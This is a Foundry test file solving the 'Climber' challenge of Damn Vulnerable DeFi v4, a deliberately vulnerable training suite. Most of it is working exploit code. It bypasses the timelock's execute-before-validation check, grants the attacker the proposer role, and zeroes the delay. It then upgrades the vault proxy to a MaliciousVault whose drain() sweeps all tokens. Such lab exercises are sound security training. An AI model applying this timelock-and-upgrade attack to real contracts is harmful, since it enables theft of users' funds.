// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console, console2} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract MaliciousVault is ClimberVault {
    function drain(address token, address to) external {
        SafeTransferLib.safeTransfer(
            token,
            to,
            IERC20(token).balanceOf(address(this))
        );
    }
}

contract ClimberAttacker {
    ClimberTimelock public timelock;
    address public vault;
    address public maliciousImpl;
    address public token;
    address public recovery;

    address[] public setupTargets;
    uint256[] public setupValues;
    bytes[] public setupData;
    bytes32 public setupSalt;

    constructor(
        address _timelock,
        address _vault,
        address _maliciousImpl,
        address _token,
        address _recovery
    ) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = _vault;
        maliciousImpl = _maliciousImpl;
        token = _token;
        recovery = _recovery;
    }

    function setSetupParams(
        address[] memory _targets,
        uint256[] memory _values,
        bytes[] memory _data,
        bytes32 _salt
    ) external {
        setupTargets = _targets;
        setupValues = _values;
        setupData = _data;
        setupSalt = _salt;
    }

    function scheduleAttack() external {
        timelock.schedule(setupTargets, setupValues, setupData, setupSalt);

        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory dataElements = new bytes[](1);
        bytes32 salt = bytes32("climber-steal");

        targets[0] = vault;
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            maliciousImpl,
            abi.encodeWithSelector(
                MaliciousVault.drain.selector,
                token,
                recovery
            )
        );

        timelock.schedule(targets, values, dataElements, salt);
    }
}

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE); //@note 0.1

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    ) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE); //@note 10,000,000

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState_climber() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        MaliciousVault maliciousImpl = new MaliciousVault();
        ClimberAttacker attacker = new ClimberAttacker(
            address(timelock),
            address(vault),
            address(maliciousImpl),
            address(token),
            recovery
        );

        address[] memory setupTargets = new address[](3);
        uint256[] memory setupValues = new uint256[](3);
        bytes[] memory setupData = new bytes[](3);
        bytes32 setupSalt = bytes32("setup");

        setupTargets[0] = address(timelock);
        setupValues[0] = 0;
        setupData[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(attacker)
        );

        setupTargets[1] = address(timelock);
        setupValues[1] = 0;
        setupData[1] = abi.encodeWithSelector(
            ClimberTimelock.updateDelay.selector,
            uint64(0)
        );

        setupTargets[2] = address(attacker);
        setupValues[2] = 0;
        setupData[2] = abi.encodeWithSelector(
            ClimberAttacker.scheduleAttack.selector
        );

        attacker.setSetupParams(
            setupTargets,
            setupValues,
            setupData,
            setupSalt
        );

        timelock.execute(setupTargets, setupValues, setupData, setupSalt);

        address[] memory stealTargets = new address[](1);
        uint256[] memory stealValues = new uint256[](1);
        bytes[] memory stealData = new bytes[](1);
        bytes32 stealSalt = bytes32("climber-steal");

        stealTargets[0] = address(vault);
        stealValues[0] = 0;
        stealData[0] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(maliciousImpl),
            abi.encodeWithSelector(
                MaliciousVault.drain.selector,
                address(token),
                recovery
            )
        );

        timelock.execute(stealTargets, stealValues, stealData, stealSalt);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
